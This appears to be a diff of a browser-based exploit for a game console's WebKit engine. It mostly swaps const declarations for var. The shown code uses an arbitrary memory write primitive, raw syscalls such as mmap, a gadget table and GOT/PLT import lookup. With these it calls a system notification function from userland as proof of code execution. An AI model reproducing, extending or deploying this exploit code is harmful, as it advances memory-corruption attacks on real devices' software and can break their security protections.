@@ -364,33 +364,33 @@ let allDone = false,
             // ===== USERLAND NOTIF via WebKit PLT/GOT (no FTP, no kernel) =====
             try {
               document.body.style.background = "#0a0";
-              const ok = true;
+              var ok = true;
 
               // First, list everything WebKit imports from SysUtil
-              const sysutilImports = listImports(p, webkitBase, "SysUtil");
-              const notifImports   = listImports(p, webkitBase, "Notif");
+              var sysutilImports = listImports(p, webkitBase, "SysUtil");
+              var notifImports   = listImports(p, webkitBase, "Notif");
               mark("IMPORTS-SYSUTIL", sysutilImports.length + " -> " + sysutilImports.slice(0, 5).join(","));
               mark("IMPORTS-NOTIF",   notifImports.length + " -> " + notifImports.slice(0, 5).join(","));
 
               // Find the notification
-              const hit = findImportByName(p, webkitBase, "sceSysUtilSendSystemNotificationWithText");
+              var hit = findImportByName(p, webkitBase, "sceSysUtilSendSystemNotificationWithText");
               if (!hit) {
                 mark("NOTIF-NOT-IMPORTED", "webkit does not import it");
               } else {
-                const fn = hit.fn;
+                var fn = hit.fn;
                 mark("NOTIF-FOUND", "fn=" + fn + " slot=0x" + hit.slot.low.toString(16));
 
                 // allocate message buffer
-                const msg = "14.00 USERLAND OK";
-                const buf = sc(SYS.mmap, 0, 0x100, 3, 0x1002, -1, 0);
-                const bufAddr = new int64(buf.lo, buf.hi);
-                for (const i = 0; i < msg.length; i++) {
+                var msg = "14.00 USERLAND OK";
+                var buf = sc(SYS.mmap, 0, 0x100, 3, 0x1002, -1, 0);
+                var bufAddr = new int64(buf.lo, buf.hi);
+                for (var i = 0; i < msg.length; i++) {
                   p.write1(bufAddr.add32(i), msg.charCodeAt(i));
                 }
                 p.write1(bufAddr.add32(msg.length), 0);
 
                 // call notify(0, buf)
-                const rc = callAddr(fn, [0, bufAddr]).i32;
+                var rc = callAddr(fn, [0, bufAddr]).i32;
                 mark("NOTIF-CALL", "rc=" + rc);
               }
             } catch (e) {
@@ -405,7 +405,7 @@ let allDone = false,
         aligned(webkitBase) && aligned(libkernelBase),
         "",
       )
-    )
+    );
 
     const G = {};
     const GAD = [
@@ -1889,7 +1889,7 @@ let allDone = false,
         check("POINTER-READ", false, "pass A found no crossing");
         return;
       }
-      const kA = KA - mA + 1;
+      var kA = KA - mA + 1;
       mark(
         "PR-PASSA",
         "m=" +
